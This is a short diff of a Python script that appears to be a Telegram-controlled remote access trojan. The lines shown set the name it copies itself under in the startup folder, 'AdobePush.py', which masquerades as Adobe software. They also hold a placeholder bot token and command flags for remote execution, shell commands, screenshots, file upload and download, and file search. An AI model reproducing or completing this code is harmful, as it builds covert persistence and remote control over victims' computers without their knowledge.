@@ -60,7 +60,7 @@ SPI_SETDESKWALLPAPER = 20
 current_active_window = ''
 current_system_time = datetime.datetime.now()
 
-copied_startup_filename = 'AdobePush.py'
+copied_startup_filename = 'AdobePush.py' # The file will be copied to startup folder by this name
 
 access_token = '' # Get access token from botfather in telegram app
 FLAGS = ["#START", "#STOP", "#EXECUTE", "#SEND", "#DOWNLOAD", "#UPLOAD", "#SCREENSHOT", "#CMD", "#WALLPAPER", "#HELP", "#SET", "#FIND"]
